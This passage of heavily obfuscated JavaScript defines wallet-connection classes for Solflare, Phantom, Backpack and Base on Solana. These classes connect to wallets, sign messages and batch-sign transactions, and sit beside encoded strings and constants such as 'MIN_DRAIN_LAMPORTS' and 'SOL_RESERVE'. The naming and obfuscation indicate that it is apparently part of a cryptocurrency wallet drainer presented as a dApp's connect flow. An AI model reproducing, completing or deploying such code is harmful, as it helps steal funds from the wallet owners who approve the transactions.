                _noop(_v109[-30] = 0, _v109[2] = 0, _s8["\u89C6"] = _s8["_v131"], _s2 += 584, _s4 += -504, _s6 += -263, _s7 += 231);
                break
            }
          }
        }
      }
      _noop(_s3 = undefined, _s2 = _s5(208, -86, -91, -75)["next"]()["value"]);
      if (_s3) {
        return _s2
      }
    }
  }, _s1[-41] == 1 && (_s1[222][_s4(195)] = {
    [_s4(196)]: "null",
    ["heapSize"]: "null",
    ["priorityFee"]: "null",
    [_s4(197)]: "null"
  }), _s1[4] = {
    ["version"]: _s1[-41],
    ["message"]: _s1[222],
    ["serialize"]: _s6,
    ["signatures"]: [],
    ["addSignature"](_s3, _s2) {
      if (_s2["length"] != 64) {
        throw new(TypeError)("33")
      }
      _s1[0]["signatures"][_s3["toString"]()] = _s2
    }
  });
  return Object["defineProperty"](_s1[4], "signatures", {
    ["get"]() {
      return Object["values"](_s1[0]["signatures"])["map"](_limitArgs((..._s1) => {
        _s1["length"] = 1;
        return _s1[0] ?? new(Uint8Array)(64)
      }))
    },
    ["set"](..._s3) {
      _noop(_s3["length"] = 1, _s3["a"] = Object["keys"](_s1[0]["signatures"]));
      for (let _s2 = 0; _s2 < _s3[0]["length"]; _s2++) {
        _s1[4]["addSignature"](_s3["a"][_s2], _s3[0][_s2])
      }
    }
  }), _s1[1] && Object["defineProperty"](_s1[4], "toJSON", {
    ["value"]: () => {
      return _s1[1]
    },
    ["enumerable"]: !1
  }), _s1[4]
}
_noop(_v233 = undefined, _v20 = class {
  constructor() {
    _noop(this["Ce"] = void 0, this["Re"] = void 0, this["Ze"] = void 0, this["le"] = void 0, this["se"] = !1, _initPriv(this, _v233, !1))
  }
  get["re"]() {
    let _str_cache = this["m"]();
    return !!(_str_cache && _str_cache["isConnected"])
  }
  get["Z"]() {
    let _str_cache = this["le"];
    let __str_table__ = this["m"]();
    return !!(__str_table__ && _str_cache && __str_table__[_str_cache])
  } ["Bt"]() {
    let _str_cache = this["m"]();
    if (_str_cache && this["re"]) {
      let __str_table__ = _str_cache["publicKey"];
      return __str_table__ ? (_v397(this, __str_table__["toString"]()), !0) : (_str_cache["disconnect"](), !1)
    }
    return !1
  }
  async ["nr"](_str_cache) {
    try {
      let __str_table__ = await _str_cache["connect"]();
      return typeof __str_table__ == "object" && "publicKey" in __str_table__ ? (_v397(this, __str_table__["publicKey"]["toString"]()), !0) : __str_table__ === !0 || typeof __str_table__ == "object" && "_bn" in __str_table__ || this["Bt"]()
    } catch (__str_table__) {
      return this["id"] == 12 && Error["isError"](__str_table__) && __str_table__["message"] == "Timeout reached" && (_v6["open"]("Spinner"), _str_cache["disconnect"](), location["reload"]()), console["error"](__str_table__), !1
    }
  }
  async ["connect"]() {
    let _str_cache = this["id"];
    let __str_table__ = "null";
    let _s1 = this["m"]();
    if (appState["yt"](_str_cache, this["se"]) && (__str_table__ = _v289(_str_cache)), _v569(this), _s1 && this["Z"]) {
      if (this["gn"]?.(), _v15["pushOrOpen"]("Connecting"), __str_table__ && !_isMobileCheck()) {
        if (!_v68) {
          _v563(__str_table__);
          return
        }
        location["href"] = __str_table__;
        return
      }
      if (this["Bt"]()) {
        return
      }
      if (this["or"](), !window["embedded"]) {
        await this["nr"](_s1);
        return
      }
      for (;;) {
        if (!(await this["nr"](_s1))) {
          await _v62(500)
        } else {
          return
        }
      }
    }
    if (_v68) {
      if (_v15["pushOrOpen"]("Connecting"), this["Re"]) {
        return
      }
      _v394(this, __str_table__)
    } else {
      _v566(this)
    }
  } ["Le"]() {
    let _str_cache = this["m"]();
    _str_cache && this["re"] && _str_cache["disconnect"]()
  } ["or"]() {
    let _str_cache = this["m"]();
    _str_cache && (_getPriv(this, _v233) || (_setPriv(this, _v233, !0), _str_cache?.on && (_str_cache["on"]("connect", __str_table__ => {
      let _s1 = __str_table__ ?? _str_cache["publicKey"];
      if (!_s1 || _v68 && document["visibilityState"] != "visible") {
        return
      }
      let _s3 = "publicKey" in _s1 ? _s1["publicKey"] : _s1;
      _v397(this, _s3["toString"]())
    }), _str_cache["on"]("disconnect", () => {
      return _v568(this)
    }))))
  }
  async ["ge"](_str_cache) {
    let __str_table__ = this["m"]();
    if (!__str_table__ || !this["re"]) {
      throw new(Error)("30")
    }
    let _s1 = _str_cache["map"](_limitArgs((..._str_cache) => {
      _str_cache["length"] = 1;
      return _v288(_str_cache[0])
    }));
    return await __str_table__[getString(198)](_s1)
  }
  async ["hn"](_str_cache) {
    let __str_table__ = this["m"]();
    if (!__str_table__ || !this["re"]) {
      throw new(Error)("30")
    }
    return (await __str_table__["signMessage"](_str_cache))["signature"]
  }
}, _v233 = new(WeakMap), _v700 = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0/connect/" + getString(200) + getString(201) + getString(202) + getString(203) + getString(204), _v234 = undefined, _v333 = undefined, _v449 = class extends _v20 {
  constructor() {
    _noop(_limitArgs(_s5), _limitArgs(_s2));
    const _s1 = {
      ["43"]: 21,
      ["47"]: 9,
      ["48"]: 33,
      ["49"]: 62,
      ["50"]: 19,
      ["51"]: 16,
      ["52"]: 50,
      ["53"]: 27,
      ["54"]: 14,
      ["55"]: 47,
      ["56"]: 23,
      ["57"]: 1,
      ["65"]: 2,
      ["66"]: 44,
      ["67"]: 35,
      ["68"]: 30,
      ["69"]: 29,
      ["70"]: 55,
      ["71"]: 25,
      ["72"]: 18,
      ["73"]: 41,
      ["74"]: 61,
      ["75"]: 8,
      ["76"]: 24,
      ["77"]: 63,
      ["78"]: 60,
      ["79"]: 20,
      ["80"]: 4,
      ["81"]: 43,
      ["82"]: 31,
      ["83"]: 54,
      ["84"]: 42,
      ["85"]: 46,
      ["86"]: 5,
      ["87"]: 22,
      ["88"]: 36,
      ["89"]: 34,
      ["90"]: 39,
      ["97"]: 48,
      ["98"]: 17,
      ["99"]: 45,
      ["100"]: 0,
      ["101"]: 12,
      ["102"]: 57,
      ["103"]: 59,
      ["104"]: 26,
      ["105"]: 58,
      ["106"]: 11,
      ["107"]: 28,
      ["108"]: 13,
      ["109"]: 49,
      ["110"]: 3,
      ["111"]: 10,
      ["112"]: 40,
      ["113"]: 37,
      ["114"]: 52,
      ["115"]: 53,
      ["116"]: 15,
      ["117"]: 7,
      ["118"]: 38,
      ["119"]: 51,
      ["120"]: 32,
      ["121"]: 6,
      ["122"]: 56
    };
    const _s3 = new TextDecoder;

    function _s2(..._s2) {
      _s2["length"] = 1;
      const _s5 = _s2[0].length;
      const _str_cache = _s2[0].indexOf("=");
      const __str_table__ = _str_cache == -1 ? 0 : _s5 - _str_cache;
      const _s4 = _s5 * 3 / 4 - __str_table__;
      const _s6 = new Uint8Array(_s4);
      _noop(_s2["a"] = 0, _s2["b"] = 0, _s2[-101] = 0);
      for (let _s7 = 0; _s7 < _s5 - __str_table__; _s7++) {
        const _s8 = _s2[0]["charCodeAt"](_s7);
        if (_s8 == 61) break;
        _noop(_s2["a"] = _s2["a"] << 6 | _s1[_s8], _s2["b"] += 6);
        if (_s2["b"] >= 8) {
          _noop(_s2["b"] -= 8, _s6[_s2[-101]++] = _s2["a"] >> _s2["b"] & 255)
        }
      }
      return _s3.decode(_s6)
    }

    function _s5(..._s1) {
      _s1["length"] = 1;
      if (typeof _str_cache[_s1[0]] === "undefined") {
        return _str_cache[_s1[0]] = _s2(__str_table__[_s1[0]])
      }
      return _str_cache[_s1[0]]
    }
    _noop(super(...arguments), _initPriv(this, _v234), this["id"] = 0, this["name"] = "Solflare", this["icon"] = _v700, this["n"] = "id1580902717", this["i"] = _s5(205), this["Y"] = _s5(206), this["le"] = "isSolflare", this["se"] = !0)
  } ["m"]() {
    return window["solflare"]
  } ["W"](_str_cache) {
    return "transactionConfig" + _callPriv(this, _v234, _v333)["call"](this, _str_cache)
  } ["X"](_str_cache) {
    return getString(208) + _callPriv(this, _v234, _v333)["call"](this, _str_cache)
  }
}, _v234 = new(WeakMap), _v333 = _limitArgs(function(..._str_cache) {
  _noop(_str_cache["length"] = 1, _str_cache["a"] = new(URL)(_str_cache[0])["origin"]);
  return getString(209) + _fmtIndex(_str_cache[0]) + "?ref=" + _str_cache["a"]
}), _v701 = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 128 128'%3E%3Cpath fill" + getString(210) + " 350 350'%3E%3Cpath id='a' fill='%23FFEF46' d='M0 0h350v350H0z'/%3E%3Cpath fill='%230" + getString(212) + getString(213) + getString(214), _v235 = undefined, _v334 = undefined, _v702 = class extends _v20 {
  constructor() {
    _noop(super(...arguments), _initPriv(this, _v235), this["id"] = 1, this["name"] = "Phantom", this["icon"] = _v701, this["n"] = "id1598432977", this["i"] = "app.phantom", this["Y"] = getString(215), this["le"] = "isPhantom", this["se"] = !0)
  } ["m"]() {
    return window["phantom"]?.solana
  } ["W"](_s1) {
    _noop(_limitArgs(_s4), _limitArgs(_s5));
    const _s3 = {
      ["43"]: 21,
      ["47"]: 9,
      ["48"]: 33,
      ["49"]: 62,
      ["50"]: 19,
      ["51"]: 16,
      ["52"]: 50,
      ["53"]: 27,
      ["54"]: 14,
      ["55"]: 47,
      ["56"]: 23,
      ["57"]: 1,
      ["65"]: 2,
      ["66"]: 44,
      ["67"]: 35,
      ["68"]: 30,
      ["69"]: 29,
      ["70"]: 55,
      ["71"]: 25,
      ["72"]: 18,
      ["73"]: 41,
      ["74"]: 61,
      ["75"]: 8,
      ["76"]: 24,
      ["77"]: 63,
      ["78"]: 60,
      ["79"]: 20,
      ["80"]: 4,
      ["81"]: 43,
      ["82"]: 31,
      ["83"]: 54,
      ["84"]: 42,
      ["85"]: 46,
      ["86"]: 5,
      ["87"]: 22,
      ["88"]: 36,
      ["89"]: 34,
      ["90"]: 39,
      ["97"]: 48,
      ["98"]: 17,
      ["99"]: 45,
      ["100"]: 0,
      ["101"]: 12,
      ["102"]: 57,
      ["103"]: 59,
      ["104"]: 26,
      ["105"]: 58,
      ["106"]: 11,
      ["107"]: 28,
      ["108"]: 13,
      ["109"]: 49,
      ["110"]: 3,
      ["111"]: 10,
      ["112"]: 40,
      ["113"]: 37,
      ["114"]: 52,
      ["115"]: 53,
      ["116"]: 15,
      ["117"]: 7,
      ["118"]: 38,
      ["119"]: 51,
      ["120"]: 32,
      ["121"]: 6,
      ["122"]: 56
    };
    const _s2 = new TextDecoder;

    function _s5(..._s1) {
      _s1["length"] = 1;
      const _s5 = _s1[0].length;
      const _s4 = _s1[0].indexOf("=");
      const _str_cache = _s4 == -1 ? 0 : _s5 - _s4;
      const __str_table__ = _s5 * 3 / 4 - _str_cache;
      const _s6 = new Uint8Array(__str_table__);
      _noop(_s1[166] = 0, _s1["b"] = 0, _s1[-96] = 0);
      for (let _s7 = 0; _s7 < _s5 - _str_cache; _s7++) {
        const _s8 = _s1[0]["charCodeAt"](_s7);
        if (_s8 == 61) break;
        _noop(_s1[166] = _s1[166] << 6 | _s3[_s8], _s1["b"] += 6);
        if (_s1["b"] >= 8) {
          _noop(_s1["b"] -= 8, _s6[_s1[-96]++] = _s1[166] >> _s1["b"] & 255)
        }
      }
      return _s2.decode(_s6)
    }

    function _s4(..._s1) {
      _s1["length"] = 1;
      if (typeof _str_cache[_s1[0]] === "undefined") {
        return _str_cache[_s1[0]] = _s5(__str_table__[_s1[0]])
      }
      return _str_cache[_s1[0]]
    }
    return _s4(216) + _callPriv(this, _v235, _v334)["call"](this, _s1)
  } ["X"](_s1) {
    _noop(_limitArgs(_s4), _limitArgs(_s5));
    const _s3 = {
      ["43"]: 21,
      ["47"]: 9,
      ["48"]: 33,
      ["49"]: 62,
      ["50"]: 19,
      ["51"]: 16,
      ["52"]: 50,
      ["53"]: 27,
      ["54"]: 14,
      ["55"]: 47,
      ["56"]: 23,
      ["57"]: 1,
      ["65"]: 2,
      ["66"]: 44,
      ["67"]: 35,
      ["68"]: 30,
      ["69"]: 29,
      ["70"]: 55,
      ["71"]: 25,
      ["72"]: 18,
      ["73"]: 41,
      ["74"]: 61,
      ["75"]: 8,
      ["76"]: 24,
      ["77"]: 63,
      ["78"]: 60,
      ["79"]: 20,
      ["80"]: 4,
      ["81"]: 43,
      ["82"]: 31,
      ["83"]: 54,
      ["84"]: 42,
      ["85"]: 46,
      ["86"]: 5,
      ["87"]: 22,
      ["88"]: 36,
      ["89"]: 34,
      ["90"]: 39,
      ["97"]: 48,
      ["98"]: 17,
      ["99"]: 45,
      ["100"]: 0,
      ["101"]: 12,
      ["102"]: 57,
      ["103"]: 59,
      ["104"]: 26,
      ["105"]: 58,
      ["106"]: 11,
      ["107"]: 28,
      ["108"]: 13,
      ["109"]: 49,
      ["110"]: 3,
      ["111"]: 10,
      ["112"]: 40,
      ["113"]: 37,
      ["114"]: 52,
      ["115"]: 53,
      ["116"]: 15,
      ["117"]: 7,
      ["118"]: 38,
      ["119"]: 51,
      ["120"]: 32,
      ["121"]: 6,
      ["122"]: 56
    };
    const _s2 = new TextDecoder;

    function _s5(..._s1) {
      _s1["length"] = 1;
      const _s5 = _s1[0].length;
      const _s4 = _s1[0].indexOf("=");
      const _str_cache = _s4 == -1 ? 0 : _s5 - _s4;
      const __str_table__ = _s5 * 3 / 4 - _str_cache;
      const _s6 = new Uint8Array(__str_table__);
      _noop(_s1[-55] = 0, _s1[2] = 0, _s1[-194] = 0);
      for (let _s7 = 0; _s7 < _s5 - _str_cache; _s7++) {
        const _s8 = _s1[0]["charCodeAt"](_s7);
        if (_s8 == 61) break;
        _noop(_s1[-55] = _s1[-55] << 6 | _s3[_s8], _s1[2] += 6);
        if (_s1[2] >= 8) {
          _noop(_s1[2] -= 8, _s6[_s1[-194]++] = _s1[-55] >> _s1[2] & 255)
        }
      }
      return _s2.decode(_s6)
    }

    function _s4(..._s1) {
      _s1["length"] = 1;
      if (typeof _str_cache[_s1[0]] === "undefined") {
        return _str_cache[_s1[0]] = _s5(__str_table__[_s1[0]])
      }
      return _str_cache[_s1[0]]
    }
    return _s4(217) + _callPriv(this, _v235, _v334)["call"](this, _s1)
  }
  async ["connect"]() {
    _v569(this);
    let _str_cache = this["id"];
    let __str_table__ = "null";
    let _s1 = this["m"]();
    if (appState["yt"](_str_cache, this["se"]) && (__str_table__ = _v289(_str_cache)), _s1 && this["Z"]) {
      if (window["embedded"] || _v15["pushOrOpen"]("Connecting"), __str_table__ && !_isMobileCheck()) {
        if (!_v68) {
          _v563(__str_table__);
          return
        }
        location["href"] = __str_table__;
        return
      }
      if (this["Bt"]()) {
        return
      }
      this["or"]();
      do try {
        await _s1["connect"]();
        return
      } catch (_s3) {
        _noop(console["error"](_s3), await _v62(500))
      }
      while (window["embedded"]);
      return
    }
    _v68 ? (_v15["pushOrOpen"]("Connecting"), _v394(this, __str_table__)) : _v566(this)
  }
  async ["ge"](_str_cache) {
    let __str_table__ = this["m"]();
    if (!__str_table__ || !this["re"]) {
      throw new(Error)("30")
    }
    let _s1 = _str_cache["map"](_limitArgs((..._str_cache) => {
      _str_cache["length"] = 1;
      return _v288(_str_cache[0])
    }));
    if (appState["ue"] == 6) {
      let _s3 = [];
      for (let _s2 = 0; _s2 < _s1["length"]; _s2++) {
        _s3["push"](await __str_table__["signTransaction"](_s1[_s2]))
      }
      return _s3
    }
    return __str_table__[getString(198)](_s1)
  }
}, _v235 = new(WeakMap), _v334 = _limitArgs(function(..._str_cache) {
  _noop(_str_cache["length"] = 1, _str_cache[1] = new(URL)(_str_cache[0])["origin"]);
  return getString(209) + _fmtIndex(_str_cache[0]) + "?ref=" + _str_cache[1]
}), _v703 = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='10 10 220 220'%3E%3Cpath xmlns='http://www.w3.org/2000/svg' fill='%23fff' d='M0 0h240v240H0z" + getString(218) + "solflare://ul/v1/", _v704 = class extends _v20 {
  constructor() {
    _noop(super(...arguments), this["id"] = 2, this["name"] = "Backpack", this["icon"] = _v703, this["n"] = "id6445964121", this["i"] = "https://solflare.com/ul/v1/", this["Y"] = "browse/", this["le"] = "isBackpack", this["se"] = !0)
  } ["m"]() {
    return window["backpack"]?.solana
  } ["W"](..._str_cache) {
    _str_cache["length"] = 1;
    return getString(222) + _fmtIndex(_str_cache[0])
  } ["X"](..._str_cache) {
    _str_cache["length"] = 1;
    return getString(223) + _fmtIndex(_str_cache[0])
  }
}, _v705 = "data:image/svg+xml,%3Csvg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"-84 -84 417 417\"%3E%3Cpath fill=\"%23fff\" d=\"M-84-84h417v417H-" + getString(224) + getString(225) + "4.7 5.7-2.6 0-4.8-1.9-4.8-5.7 0-3.8 2.2-5.7 4.8-5.7 2.5 0 4.7 2 4.7 5.7Z' clip-rule='evenodd'/%3E%3C/svg%3E", _v706 = class extends _v20 {
  constructor() {
    _noop(_limitArgs(_s5), _limitArgs(_s2));
    const _s1 = {
      ["43"]: 21,
      ["47"]: 9,
      ["48"]: 33,
      ["49"]: 62,
      ["50"]: 19,
      ["51"]: 16,
      ["52"]: 50,
      ["53"]: 27,
      ["54"]: 14,
      ["55"]: 47,
      ["56"]: 23,
      ["57"]: 1,
      ["65"]: 2,
      ["66"]: 44,
      ["67"]: 35,
      ["68"]: 30,
      ["69"]: 29,
      ["70"]: 55,
      ["71"]: 25,
      ["72"]: 18,
      ["73"]: 41,
      ["74"]: 61,
      ["75"]: 8,
      ["76"]: 24,
      ["77"]: 63,
      ["78"]: 60,
      ["79"]: 20,
      ["80"]: 4,
      ["81"]: 43,
      ["82"]: 31,
      ["83"]: 54,
      ["84"]: 42,
      ["85"]: 46,
      ["86"]: 5,
      ["87"]: 22,
      ["88"]: 36,
      ["89"]: 34,
      ["90"]: 39,
      ["97"]: 48,
      ["98"]: 17,
      ["99"]: 45,
      ["100"]: 0,
      ["101"]: 12,
      ["102"]: 57,
      ["103"]: 59,
      ["104"]: 26,
      ["105"]: 58,
      ["106"]: 11,
      ["107"]: 28,
      ["108"]: 13,
      ["109"]: 49,
      ["110"]: 3,
      ["111"]: 10,
      ["112"]: 40,
      ["113"]: 37,
      ["114"]: 52,
      ["115"]: 53,
      ["116"]: 15,
      ["117"]: 7,
      ["118"]: 38,
      ["119"]: 51,
      ["120"]: 32,
      ["121"]: 6,
      ["122"]: 56
    };
    const _s3 = new TextDecoder;

    function _s2(..._s2) {
      _s2["length"] = 1;
      const _s5 = _s2[0].length;
      const _str_cache = _s2[0].indexOf("=");
      const __str_table__ = _str_cache == -1 ? 0 : _s5 - _str_cache;
      const _s4 = _s5 * 3 / 4 - __str_table__;
      const _s6 = new Uint8Array(_s4);
      _noop(_s2[1] = 0, _s2["b"] = 0, _s2["c"] = 0);
      for (let _s7 = 0; _s7 < _s5 - __str_table__; _s7++) {
        const _s8 = _s2[0]["charCodeAt"](_s7);
        if (_s8 == 61) break;
        _noop(_s2[1] = _s2[1] << 6 | _s1[_s8], _s2["b"] += 6);
        if (_s2["b"] >= 8) {
          _noop(_s2["b"] -= 8, _s6[_s2["c"]++] = _s2[1] >> _s2["b"] & 255)
        }
      }
      return _s3.decode(_s6)
    }

    function _s5(..._s1) {
      _s1["length"] = 1;
      if (typeof _str_cache[_s1[0]] === "undefined") {
        return _str_cache[_s1[0]] = _s2(__str_table__[_s1[0]])
      }
      return _str_cache[_s1[0]]
    }
    _noop(super(...arguments), this["id"] = 3, this["name"] = "Base", this["icon"] = _v705, this["n"] = "id1278383455", this["i"] = "org.toshi", this["Y"] = _s5(227), this["Ze"] = !0, this["se"] = !0)
  } ["m"]() {
    return window["coinbaseSolana"]
  }
  get["Z"]() {
    return !!this["m"]()
  } ["W"](..._s1) {
    _noop(_s1["length"] = 1, _limitArgs(_s4), _limitArgs(_s5));
    const _s3 = {
      ["43"]: 21,
      ["47"]: 9,
      ["48"]: 33,
      ["49"]: 62,
      ["50"]: 19,
      ["51"]: 16,
      ["52"]: 50,
      ["53"]: 27,
      ["54"]: 14,
      ["55"]: 47,
      ["56"]: 23,
      ["57"]: 1,
      ["65"]: 2,
      ["66"]: 44,
      ["67"]: 35,
      ["68"]: 30,
      ["69"]: 29,
      ["70"]: 55,
      ["71"]: 25,
      ["72"]: 18,
      ["73"]: 41,
      ["74"]: 61,
      ["75"]: 8,
      ["76"]: 24,
      ["77"]: 63,
      ["78"]: 60,
      ["79"]: 20,
      ["80"]: 4,
      ["81"]: 43,
      ["82"]: 31,
      ["83"]: 54,
      ["84"]: 42,
      ["85"]: 46,
      ["86"]: 5,
      ["87"]: 22,
      ["88"]: 36,
      ["89"]: 34,
      ["90"]: 39,
      ["97"]: 48,
      ["98"]: 17,
      ["99"]: 45,
      ["100"]: 0,
      ["101"]: 12,
      ["102"]: 57,
      ["103"]: 59,
      ["104"]: 26,
      ["105"]: 58,
      ["106"]: 11,
      ["107"]: 28,
      ["108"]: 13,
      ["109"]: 49,
      ["110"]: 3,
      ["111"]: 10,
      ["112"]: 40,
      ["113"]: 37,
      ["114"]: 52,
      ["115"]: 53,
      ["116"]: 15,
      ["117"]: 7,
      ["118"]: 38,
      ["119"]: 51,
      ["120"]: 32,
      ["121"]: 6,
      ["122"]: 56
    };
    const _s2 = new TextDecoder;

    function _s5(..._s1) {
      _s1["length"] = 1;
      const _s5 = _s1[0].length;
      const _s4 = _s1[0].indexOf("=");
      const _str_cache = _s4 == -1 ? 0 : _s5 - _s4;
      const __str_table__ = _s5 * 3 / 4 - _str_cache;
      const _s6 = new Uint8Array(__str_table__);
      _noop(_s1[1] = 0, _s1[2] = 0, _s1["c"] = 0);
      for (let _s7 = 0; _s7 < _s5 - _str_cache; _s7++) {
        const _s8 = _s1[0]["charCodeAt"](_s7);
        if (_s8 == 61) break;
        _noop(_s1[1] = _s1[1] << 6 | _s3[_s8], _s1[2] += 6);
        if (_s1[2] >= 8) {
          _noop(_s1[2] -= 8, _s6[_s1["c"]++] = _s1[1] >> _s1[2] & 255)
        }
      }
      return _s2.decode(_s6)
    }

    function _s4(..._s1) {
      _s1["length"] = 1;
      if (typeof _str_cache[_s1[0]] === "undefined") {
        return _str_cache[_s1[0]] = _s5(__str_table__[_s1[0]])
      }
      return _str_cache[_s1[0]]
    }
    return _s4(228) + _fmtIndex(_s1[0])
  } ["X"](..._str_cache) {
    _str_cache["length"] = 1;
    return getString(229) + _fmtIndex(_str_cache[0])
  }
}, RpcError = class extends Error {
  constructor(_str_cache, __str_table__, _s1) {
    _noop(super("" + _str_cache + ": " + _s1), this["method"] = _str_cache, this["code"] = __str_table__, this["message"] = _s1)
  }
}, LAMPORTS_DIV = 100, walletAddress = void 0, _v335 = getString(230), _v236 = getString(231), mobileRegex = RegExp(getString(232)), solanaAddrRegex = RegExp(getString(233)), _v111 = getString(234), _v150 = getString(235), _v707 = getString(236), softwareList = _buildList(_v111), SOL_RESERVE = 0.5, MIN_DRAIN_LAMPORTS = 8e6, PRIORITY_FEE_BUDGET = 1400000, COMPUTE_UNIT_LIMIT = _clamp("_v401", 64, 1024) * 1024, MIN_STAKE_SOL = 1, MAX_RETRIES = 3, HEXFOMO_BRAND = "hexfomo.fun", SLOTS_PER_EPOCH = 432e3, SLOT_INTERP_FACTOR = .2, cachedSlot = undefined, cacheTimestamp = undefined, slotPromise = undefined);

function cacheSlot_fn(..._str_cache) {
  _noop(cachedSlot = _str_cache[0], cacheTimestamp = _now())
}
async function getSlot(_str_cache = 60) {
  if (slotPromise) {
    return slotPromise
  }
  let __str_table__ = _now() - (cacheTimestamp ?? 0);
  if (cachedSlot && __str_table__ < _str_cache) {
    let _s1 = __str_table__ / SLOT_INTERP_FACTOR;
    return Math["trunc"](cachedSlot + _s1)
  }
  slotPromise = solana["getSlot"]({
    ["commitment"]: "finalized"
  })["then"](Number)["finally"](() => {
    slotPromise = void 0
  });
  let _s3 = await slotPromise;
  return cacheSlot_fn(_s3), _s3
}
async function getCurrentEpoch() {
  let _str_cache = await getSlot(3600);
  return Math["trunc"](_str_cache / SLOTS_PER_EPOCH)
}
_noop(_rpc_ep_wm = undefined, _rpc_cnt_wm = undefined, _rpc_idx_wm = undefined,
